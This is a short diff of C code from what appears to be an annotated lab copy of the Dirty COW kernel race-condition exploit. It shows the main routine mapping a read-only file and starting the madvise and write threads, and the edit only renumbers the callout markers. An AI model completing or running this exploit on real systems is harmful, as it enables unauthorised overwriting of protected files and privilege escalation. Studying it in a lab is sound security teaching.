@@ -103,12 +103,12 @@ file_size = st.st_size;
 map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
 
 // Find the position of the target area
-char *position = strstr(map, "222222"); ¿
+char *position = strstr(map, "222222");    1
 
 // We have to do the attack using two threads.
-pthread_create(&pth1, NULL, madviseThread, (void *)file_size); ¡
+pthread_create(&pth1, NULL, madviseThread, (void *)file_size);   2
 
-pthread_create(&pth2, NULL, writeThread, position); ¬
+pthread_create(&pth2, NULL, writeThread, position);   3
 
 // Wait for the threads to finish.
 pthread_join(pth1, NULL);
